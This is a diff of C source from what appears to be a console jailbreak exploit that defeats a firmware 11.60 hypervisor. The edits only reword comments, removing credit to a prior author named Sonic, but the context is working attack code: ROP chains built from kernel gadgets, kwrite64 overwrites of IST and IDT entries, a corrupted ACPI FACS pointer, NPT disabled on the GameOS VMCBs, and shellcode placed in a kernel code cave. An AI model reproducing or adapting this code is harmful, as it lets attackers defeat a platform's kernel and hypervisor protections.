@@ -15,7 +15,7 @@
 #include <unistd.h>
 
 /*
- * This is the 11.60 substitution at Sonic's high-firmware carrier seam:
+ * This is the 11.60 substitution at the high-firmware resume carrier seam:
  *
  *   startup_mp DR0 hook -> AP payload at PA 0x3ffff000 -> disable NPT on all
  *   16 GameOS VMCBs -> stock wake path -> #GP/#SX ROP -> kernel wake blob.
@@ -188,7 +188,7 @@ static int validate_wake_cave(size_t shellcode_len) {
    * does not make a kernel_copyout safe.  The frozen 0xD30000 dump proves the
    * complete [0xD2B000,0xD30000) tail is NOP-filled; this live gate therefore
    * checks only that every destination page is still present and executable.
-   * Sonic likewise performs no pre-arm content read of its destination cave.
+   * The 13.60 reference likewise does no pre-arm read of its destination cave.
    */
   for (size_t off = 0; off < shellcode_len; off += 0x1000)
     if (walk_page(kg(env_offset.KERNEL_CODE_CAVE) + off, 0))
@@ -510,7 +510,7 @@ static int build_sx_rop(uint64_t ist, size_t shellcode_len) {
   uint64_t rop[16] = {0};
   uint64_t *p = rop;
 
-  /* Sonic's essential 13.xx transfer sequence.  Its three UART breadcrumb
+  /* The essential 13.xx reference transfer sequence.  Its three UART breadcrumb
    * writes use an accidental OR [rcx],eax gadget that does not exist in the
    * 11.60 kernel; they are diagnostic-only and intentionally omitted. */
   *p++ = kg(env_offset.GAD_POP_RDI_RET);
@@ -610,14 +610,14 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   checkpoint_1160_hv("final IST7/IDT/FACS mutations begin");
   kwrite64(kg(env_offset.COMMON_TSS) + TSS_IST(7), sx_ist + 0x1000);
-  /* #GP and #SX have a six-qword IST frame.  Match Sonic's distinct final
+  /* #GP and #SX have a six-qword IST frame.  Match the distinct 13.60 final
    * pivot: add rsp,0x28 plus pop rbp advances all 0x30 bytes before ret enters
    * the ROP chain.  The no-pop pivot above remains exclusive to the
    * error-code-free #DB startup carrier. */
   setidt(13, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
   setidt(30, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
 
-  /* Matches Sonic: corrupt the FACS pointer so the stock wake path reaches
+  /* As on 13.60, corrupt the FACS pointer so the stock wake path reaches
    * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
   kwrite64(kg(env_offset.ACPIGBL_FACS), kg(env_offset.ACPIGBL_FACS) - 8);
   checkpoint_1160_hv("final IST7/IDT/FACS mutations complete");
